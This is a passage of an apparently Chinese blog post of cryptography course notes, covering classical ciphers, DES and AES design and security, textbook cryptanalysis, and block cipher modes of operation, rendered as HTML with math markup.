href="https://hstar.me/2020/08/hill-cipher-study/">https://hstar.me/2020/08/hill-cipher-study/</a></li></ul></li></ul></li></ul></li><li>置换密码/换位密码 --&gt; 对符号进行重新排序</li></ul><h2 id="替换密码"><a class="markdownIt-Anchor" href="#替换密码"></a> 替换密码</h2><h3 id="单表替换"><a class="markdownIt-Anchor" href="#单表替换"></a> 单表替换</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312302055134.png" alt="image-20231230205505052" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312302055960.png" alt="image-20231230205530887" /></p><h3 id="多表替换"><a class="markdownIt-Anchor" href="#多表替换"></a> 多表替换</h3><h4 id="维吉尼亚密码"><a class="markdownIt-Anchor" href="#维吉尼亚密码"></a> 维吉尼亚密码</h4><ul><li><p>破解</p><ul><li><p>确定密钥长度d</p><ul><li>Kasiski测试法</li><li>重合指数法</li></ul></li><li><p>确定具体的密钥字</p><ul><li>重合互指数(两种 -&gt; PPT/<a href="https://zhuanlan.zhihu.com/p/386388707">网站</a>)</li></ul></li></ul></li></ul><h4 id="hill密码"><a class="markdownIt-Anchor" href="#hill密码"></a> hill密码</h4><ul><li>明文-密文对分析法：指攻击者不仅获得了若干密文，还得到了密文对应的明文，通过若干明文-密文对分析密钥的方法</li><li>对于希尔密码，其抵抗频率分析攻击的能力非常强，若仅知若干密文是很难破译明文的；但如果知道比密钥长度多的明文-密文对，则破译就相对容易</li></ul><h2 id="置换密码"><a class="markdownIt-Anchor" href="#置换密码"></a> 置换密码</h2><ul><li>明文字符集保持不变，但顺序被打乱</li><li>栏珊密码等</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401030023563.png" alt="image-20240103002322471" /></p><h1 id="第4章-分组密码"><a class="markdownIt-Anchor" href="#第4章-分组密码"></a> 第4章 分组密码</h1><h2 id="des与aes区别"><a class="markdownIt-Anchor" href="#des与aes区别"></a> DES与AES区别</h2><h3 id="des"><a class="markdownIt-Anchor" href="#des"></a> DES</h3><p>特点：</p><ol><li><p>使用了S盒，而S盒现在已经是几乎所有分组密码算法不可缺少的部件</p></li><li><p>迭代分组密码是分组密码的主流设计</p></li><li><p>轮函数结构是Feistel网络，这种结构现在已经是轮函数的经典结构之一</p></li><li><p>算法的第一个和最后一个部件没有密钥的参与，在已知明文攻击之下不起任何安全性作用。以后的分组密码纠正了这个缺点</p></li></ol><p>安全性主要争论：</p><ol><li><p>对DES的S盒、迭代次数、密钥长度等设计准则的争议</p><ul><li>S盒的设计准则还没有完全公开，人们仍然不知道S盒的构造中是否使用了进一步的设计准则</li></ul></li><li><p>DES存在一些<strong>弱密钥和半弱密钥</strong></p></li><li><p>DES的56位密钥无法抵抗穷举攻击</p></li><li><p>代数结构存在互补对称性 -&gt; 选择明文攻击，工作量减少了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>55</mn></msup></mrow><annotation encoding="application/x-tex">2^{55}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></span></p></li></ol><p>破译方法：</p><ul><li>差分分析方法<ul><li>一种选择明文攻击</li><li>通过分析特定明文差对结果密文差的影响来获得可能性最大的密钥</li></ul></li><li>线性分析方法<ul><li>寻找一个给定密码算法的有关明文比特、密文比特和密钥比特的有效线性近似表达式，通过选择充分多的明－密文对来分析密钥的某些比特</li></ul></li></ul><h3 id="aes"><a class="markdownIt-Anchor" href="#aes"></a> AES</h3><p>安全性：</p><ul><li><p>避免弱密钥</p><ul><li>AES在设计上不是对称的，其加密和解密过程不一致，这也避免弱密钥的存在</li></ul></li><li><p>差分分析和线性分析</p><ul><li>由于在设计时考虑了这两种攻击的方法，因此AES具有较好的抗击其攻击的能力</li></ul></li><li><p>密钥穷举攻击</p><ul><li>平均需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>127</mn></msup></mrow><annotation encoding="application/x-tex">2^{127}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span>次AES运算，计算量是非常大</li></ul></li></ul><p>与DES相比：</p><ol><li>key的长度至少为128位，大于DES</li><li>AES面向字节运算，DES则是面向bit</li><li>AES加解密运算不同，加密器不可以作为解密器，而DES可以</li></ol><h2 id="设计要求"><a class="markdownIt-Anchor" href="#设计要求"></a> 设计要求</h2><ul><li><p><strong>分组长度要足够大</strong></p><ul><li>假设n为分组长度，则要使<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>足够大，防止明文穷举攻击</li></ul></li><li><p><strong>密钥量要足够大</strong></p><ul><li>防止密钥穷举攻击</li></ul></li><li><p><strong>密码变换要足够复杂</strong></p><ul><li>使攻击者除穷举攻击外，找不到其他简洁的数学攻击方法</li></ul></li><li><p><strong>加密和解密运算简单</strong></p><ul><li>便于软件和硬件的实现</li></ul></li><li><p><strong>无数据扩展和压缩</strong></p></li></ul><h2 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h2><ol><li>速度快，安全性高，易于标准化和硬件实现</li><li>现代实现数据保密性的重要机制，有广泛应用</li><li>是构造伪随机数生成器，hash函数的方法</li></ol><h2 id="基本准则"><a class="markdownIt-Anchor" href="#基本准则"></a> 基本准则</h2><h3 id="扩散"><a class="markdownIt-Anchor" href="#扩散"></a> 扩散</h3><p>​扩散原则(移位)：密钥或明文的每一比特变化影响密文的许多比特的变化，以便隐蔽明文的统计特性(形象的称为雪崩效应)</p><h3 id="混淆"><a class="markdownIt-Anchor" href="#混淆"></a> 混淆</h3><p>​混淆原则(替代)：又称混乱原则，指密钥和明文以及密文之间的依赖关系尽可能的复杂化，以防通过统计分析法进行破译(如使用非线性变换)</p><h3 id="乘积密码"><a class="markdownIt-Anchor" href="#乘积密码"></a> 乘积密码</h3><p>​如果密码体制R不是一个幂等的密码体制(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup><mo>=</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">R^{2}=R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>)，则对 n &gt; 1，迭代密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>R</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">R^{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>的安全性可能会比R强</p><ul><li>典型的迭代密码定义了一个轮函数和一个密钥编排方案，对明文的加密将经过多轮迭代</li><li>分组密码设计中主要使用两种迭代网络结构<ul><li>Feistel网络 --&gt; DES</li><li>SP网络 --&gt; S代换和P置换交替进行多次迭代形成的网络</li></ul></li></ul><h4 id="feistel网络"><a class="markdownIt-Anchor" href="#feistel网络"></a> Feistel网络</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312302146068.png" alt="image-20231230214652003" /></p><h4 id="sp网络"><a class="markdownIt-Anchor" href="#sp网络"></a> SP网络</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312311042680.png" alt="image-20231231104231542" /></p><ul><li>S变换起混淆的作用； P变换起扩散的作用</li></ul><h3 id="设计准则"><a class="markdownIt-Anchor" href="#设计准则"></a> 设计准则</h3><h4 id="论函数f的设计准则"><a class="markdownIt-Anchor" href="#论函数f的设计准则"></a> 论函数F的设计准则</h4><ul><li>轮函数F是分组密码的核心，是分组密码中单轮加解密函数，其基本准则：<ul><li>非线性(主要依赖S盒)</li><li>可逆性(能够实现解密)</li><li>雪崩效应</li><li>位独立(要求输入中某一位的变化，引起输出中其他位的变化应是彼此无关的)</li></ul></li><li>其主要性能指标是安全性、速度、灵活性</li></ul><h4 id="子密钥的生成方法"><a class="markdownIt-Anchor" href="#子密钥的生成方法"></a> 子密钥的生成方法</h4><ul><li>密钥的生成是从初始(种子)密钥产生迭代的各轮要使用的子密钥的算法。轮函数F的功能是在子密钥的参与和控制下实现的，其评价指标：<ul><li>实现简单、速度满足要求</li><li>种子密钥的所有比特对每个子密钥比特的影响应大致相同</li><li>密钥和密文之间符合雪崩效应准则</li><li>没有弱密钥或弱密钥容易确定</li></ul></li></ul><h4 id="迭代的轮数"><a class="markdownIt-Anchor" href="#迭代的轮数"></a> 迭代的轮数</h4><ul><li>一般来说，分组密码迭代轮数越多，密码分析越困难，但也不是追求迭代轮数越多越好，过多会使输入与输出的关系复杂化，而安全性增强不明显</li><li>决定迭代轮数的准则：使密码分析的难度大于简单穷举搜索攻击的难度</li><li>分组密码迭代轮数一般采用8，10，12，16，20的居多</li></ul><h2 id="des-2"><a class="markdownIt-Anchor" href="#des-2"></a> DES</h2><p>DES的优点和缺点被密码学界淋漓尽致地讨论，举例如下：</p><ol><li><p>使用了S盒，而S盒现在已经是几乎所有分组密码算法不可缺少的部件</p></li><li><p>迭代分组密码是分组密码的主流设计</p></li><li><p>轮函数结构是Feistel网络，这种结构现在已经是轮函数的经典结构之一</p></li><li><p>算法的第一个和最后一个部件没有密钥的参与，在已知明文攻击之下不起任何安全性作用。以后的分组密码纠正了这个缺点</p></li></ol><h3 id="算法原理"><a class="markdownIt-Anchor" href="#算法原理"></a> 算法原理</h3><p>P置换-&gt;16轮加密-&gt;ip逆置换</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401040844070.png" alt="image-20240104084429955" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401040844457.png" alt="image-20240104084419310" /></p><h3 id="des的安全性"><a class="markdownIt-Anchor" href="#des的安全性"></a> DES的安全性</h3><h4 id="主要争论"><a class="markdownIt-Anchor" href="#主要争论"></a> 主要争论</h4><ol><li><p>对DES的S盒、迭代次数、密钥长度等设计准则的争议</p><ul><li>S盒的设计准则还没有完全公开，人们仍然不知道S盒的构造中是否使用了进一步的设计准则</li></ul></li><li><p>DES存在一些<strong>弱密钥和半弱密钥</strong></p></li><li><p>DES的56位密钥无法抵抗穷举攻击</p></li><li><p>代数结构存在互补对称性 -&gt; 选择明文攻击，工作量减少了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>55</mn></msup></mrow><annotation encoding="application/x-tex">2^{55}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></span></p></li></ol><h4 id="弱密钥"><a class="markdownIt-Anchor" href="#弱密钥"></a> 弱密钥</h4><ul><li><p>给定初始密钥K生成子密钥时，将种子密钥分成两个部分，如果<strong>K使得这两部分的每一部分的所有位置全为0或1</strong>，则经子密钥产生器产生的各个子密钥都相同，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mn>1</mn></msub><mo>=</mo><msub><mi>K</mi><mn>2</mn></msub><mo>=</mo><mo>…</mo><mo>…</mo><mo>=</mo><msub><mi>K</mi><mn>16</mn></msub></mrow><annotation encoding="application/x-tex">K_{1}=K_{2}=……=K_{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则称密钥K为弱密钥(共有4个)</p></li><li><p>若K为弱密钥，则对任意的64比特信息有：</p></li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mtext> 和 </mtext><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">E_k(E_k(m))=m\text{ 和 }D_k(D_k(m))=m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord text"><span class="mord"> </span><span class="mord cjk_fallback">和</span><span class="mord"> </span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span></span></p><h4 id="半弱密钥"><a class="markdownIt-Anchor" href="#半弱密钥"></a> 半弱密钥</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312311541753.png" alt="image-20231231154113638" /></p><h4 id="互补性"><a class="markdownIt-Anchor" href="#互补性"></a> 互补性</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312311541525.png" alt="image-20231231154147487" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312311541210.png" alt="image-20231231154159157" /></p><h4 id="破译方法"><a class="markdownIt-Anchor" href="#破译方法"></a> 破译方法</h4><ul><li>差分分析方法<ul><li>一种选择明文攻击</li><li>通过分析特定明文差对结果密文差的影响来获得可能性最大的密钥</li></ul></li><li>线性分析方法<ul><li>寻找一个给定密码算法的有关明文比特、密文比特和密钥比特的有效线性近似表达式，通过选择充分多的明－密文对来分析密钥的某些比特</li></ul></li></ul><h3 id="多重des"><a class="markdownIt-Anchor" href="#多重des"></a> 多重DES</h3><h4 id="2des"><a class="markdownIt-Anchor" href="#2des"></a> 2DES</h4><ul><li>中途相遇攻击</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312311546928.png" alt="image-20231231154608859" /></p><h4 id="3des"><a class="markdownIt-Anchor" href="#3des"></a> 3DES</h4><ul><li>4种方式</li><li>密钥空间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>112</mn></msup></mrow><annotation encoding="application/x-tex">2^{112}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li></ul><h2 id="aes-2"><a class="markdownIt-Anchor" href="#aes-2"></a> AES</h2><h3 id="算法流程"><a class="markdownIt-Anchor" href="#算法流程"></a> 算法流程</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312312042715.png" alt="image-20231231204239629" /></p><h3 id="有限域算法"><a class="markdownIt-Anchor" href="#有限域算法"></a> 有限域算法</h3><ul><li>加法：字节异或</li><li>乘法：多项式相乘，然后其中加法异或，最后模不可约多项式(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^{8}+x^{4}+x^{3}+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>)得到的最高项指数小于8的余数即为所求。</li></ul><h3 id="安全性"><a class="markdownIt-Anchor" href="#安全性"></a> 安全性</h3><ul><li><p>弱密钥</p><ul><li>AES在设计上不是对称的，其加密和解密过程不一致，这也避免弱密钥的存在</li></ul></li><li><p>差分分析和线性分析</p><ul><li>由于在设计时考虑了这两种攻击的方法，因此AES具有较好的抗击其攻击的能力</li></ul></li><li><p>密钥穷举攻击</p><ul><li>平均需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>127</mn></msup></mrow><annotation encoding="application/x-tex">2^{127}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span>次AES运算，计算量是非常大</li></ul></li></ul><h2 id="工作模式"><a class="markdownIt-Anchor" href="#工作模式"></a> 工作模式</h2><ol><li>电码本模式(ECB ，Electronic Code Book)</li><li>密码分组链接模式(CBC ，Cipher Block Chaining)</li><li>输出反馈模式(OFB，Output Feedback)</li><li>密码反馈模式(CFB，Cipher Feedback)</li><li>计数器模式(CTR，Counter)</li></ol><h3 id="ecb"><a class="markdownIt-Anchor" href="#ecb"></a> ECB</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312312325409.png" alt="image-20231231232510271" /></p><p>​特点：</p><ol><li>操作简单，主要用于内容较短且随机的报文的加密；</li><li>相同明文(在相同密钥下)得出相同的密文，即明文中的重复内容将在密文中表现出来，容易实现统计分析攻击、分组重放攻击和代换攻击；</li><li>链接依赖性：各组的加密都独立于其它分组，可实现并行处理；</li><li>错误传播：单个密文分组中有一个或多个比特错误<strong>只会影响该分组的解密结果</strong></li></ol><h3 id="cbc"><a class="markdownIt-Anchor" href="#cbc"></a> CBC</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312312325202.png" alt="image-20231231232536160" /></p><p>特点：</p><ol><li>一种反馈机制在分组密码中的应用，每个密文分组不仅依赖于产生它的明文分组，还依赖于它前面的所有分组；</li><li>相同的明文，即使相同的密钥下也会得到不同的密文分组，隐藏了明文的统计特性；</li><li>链接依赖性：对于一个正确密文分组的正确解密要求它之前的那个密文分组也正确，不能实现并行处理；</li><li>错误传播：密文分组中的一个单比特错误会影响到<strong>本组和其后分组</strong>的解密，错误传播为两组；</li><li>初始化向量IV不需要保密，它可以明文形式与密文一起传送</li></ol><h3 id="cfb"><a class="markdownIt-Anchor" href="#cfb"></a> CFB</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401040900607.png" alt="image-20240104090054495" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401040901868.png" alt="image-20240104090105780" /></p><p>CFB的优点：自同步能力强，可以处理任意长度的消息<br />CFB的缺点：</p><ol><li>明文某一组中有错，使以后的密文组都受影响，但经解密后，除原有误的一组外，其后各组都正确地恢复</li><li>密文里的一位错误会引起明文的一个单独错误，此错误进入移位寄存器，导致密文成为无用信息，直到该错误从移位寄存器中移出</li></ol><h3 id="ofb"><a class="markdownIt-Anchor" href="#ofb"></a> OFB</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401040901604.png" alt="image-20240104090124496" 